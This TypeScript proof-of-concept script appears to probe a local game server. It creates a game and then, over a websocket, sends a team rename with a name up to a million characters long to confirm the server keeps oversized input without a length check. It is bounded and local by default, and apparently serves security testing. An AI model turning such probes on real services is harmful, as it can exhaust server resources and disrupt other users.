const target = process.env.TARGET ?? "http://127.0.0.1:3000";
const nameLength = Number.parseInt(process.env.NAME_LENGTH ?? "100000", 10);

if (!Number.isSafeInteger(nameLength) || nameLength < 1 || nameLength > 1_000_000) {
  throw new Error("NAME_LENGTH must be an integer from 1 to 1000000 for this bounded local probe.");
}

console.log(`[+] target: ${target}`);
console.log("[+] creating local game");

const createResponse = await fetch(`${target}/api/games`, {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ homeName: "Home", awayName: "Away" }),
});

if (createResponse.status !== 201) {
  throw new Error(`game creation failed with HTTP ${createResponse.status}`);
}

const createBody = (await createResponse.json()) as { gameId?: unknown };
if (typeof createBody.gameId !== "string") {
  throw new Error("game creation did not return a gameId");
}

const gameId = createBody.gameId;
const websocketUrl = target.replace(/^http:/, "ws:").replace(/^https:/, "wss:");
const targetOrigin = new URL(target).origin;
const largeName = "A".repeat(nameLength);

type BunWebSocketConstructor = new (
  url: string | URL,
  options: { headers: Record<string, string> },
) => WebSocket;

const BunWebSocket = WebSocket as unknown as BunWebSocketConstructor;

console.log("[+] connecting websocket");
const socket = new BunWebSocket(`${websocketUrl}/ws`, {
  headers: {
    origin: targetOrigin,
  },
});

let subscribed = false;

await new Promise<void>((resolve, reject) => {
  const timeout = setTimeout(
    () => reject(new Error("timed out waiting for retained snapshot")),
    10_000,
  );

  socket.addEventListener("open", () => {
    socket.send(JSON.stringify({ type: "subscribe-game", gameId, role: "controller" }));
  });

  socket.addEventListener("message", (event) => {
    const message = JSON.parse(String(event.data)) as {
      type?: unknown;
      game?: { state?: { homeName?: unknown } };
    };

    if (message.type !== "game-snapshot") {
      return;
    }

    if (!subscribed) {
      subscribed = true;
      console.log(`[+] sending rename-teams with ${nameLength} byte homeName`);
      socket.send(
        JSON.stringify({
          type: "apply-commands",
          gameId,
          commands: [
            {
              id: crypto.randomUUID(),
              clientSentAtMs: Date.now(),
              command: {
                type: "rename-teams",
                homeName: largeName,
                awayName: "Away",
              },
            },
          ],
        }),
      );
      return;
    }

    const homeName = message.game?.state?.homeName;
    if (typeof homeName === "string" && homeName.length === nameLength) {
      clearTimeout(timeout);
      console.log(`[+] snapshot retained homeName length ${homeName.length}`);
      socket.close();
      resolve();
    }
  });

  socket.addEventListener("error", () => {
    clearTimeout(timeout);
    reject(new Error("websocket error"));
  });
});

console.log("[+] local-only probe complete");
